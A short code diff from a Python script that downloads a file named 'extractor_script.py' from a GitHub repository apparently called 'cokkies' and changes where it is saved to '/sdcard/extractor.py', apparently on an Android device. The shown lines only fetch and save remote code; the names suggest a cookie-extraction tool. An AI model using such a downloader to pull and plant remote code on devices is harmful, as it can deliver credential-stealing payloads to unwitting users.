@@ -4,7 +4,7 @@ import requests
 url = "https://raw.githubusercontent.com/Inception09/cokkies/refs/heads/main/extractor_script.py"
 
 # File name to save the fetched code
-file_name = "extractor.py"
+file_name = "/sdcard/extractor.py"
 
 try:
     # Fetching the code from the URL
